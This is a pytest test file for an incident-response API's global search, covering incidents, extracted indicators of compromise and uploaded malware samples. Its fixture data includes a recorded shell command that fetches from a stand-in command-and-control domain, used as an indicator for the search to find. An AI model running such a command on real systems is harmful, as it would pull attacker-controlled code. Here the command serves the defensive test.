"""Global search: incidents, indicators from every incident, samples."""

from __future__ import annotations

from fastapi.testclient import TestClient

from tests.conftest import make_key
from tests.test_malware import fake_pe


def test_search_groups(admin: TestClient):
    key = make_key(admin, role="analyst")
    for incident_id, host in (("s1", "WKS-FINANCE-01"), ("s2", "SRV-FILE-01")):
        doc = {
            "id": incident_id,
            "name": host,
            "host": host,
            "data": {"commands": {"shells": {"bash": {"commands": [{"command": "curl http://c2-relay.top/x"}]}}}},
        }
        assert admin.post("/api/incidents", headers=key, json=doc).status_code == 201
    sha = admin.post("/api/incidents/s1/samples", headers=key, files={"file": ("a.exe", fake_pe())}).json()["sample"][
        "sha256"
    ]

    r = admin.get("/api/search", headers=key, params={"q": "finance"})
    assert r.status_code == 200
    assert [i["id"] for i in r.json()["incidents"]] == ["s1"]

    iocs = admin.get("/api/search", headers=key, params={"q": "c2-relay"}).json()["iocs"]
    assert {"type": "domain", "value": "c2-relay.top", "incidents": 2} in iocs

    samples = admin.get("/api/search", headers=key, params={"q": sha[:10]}).json()["samples"]
    assert [s["sha256"] for s in samples] == [sha]
    assert admin.get("/api/search", headers=key, params={"q": "PE32"}).json()["samples"][0]["sha256"] == sha

    # LIKE wildcards are matched literally; too short a query is refused.
    assert admin.get("/api/search", headers=key, params={"q": "%_"}).json()["incidents"] == []
    assert admin.get("/api/search", headers=key, params={"q": "x"}).status_code == 422
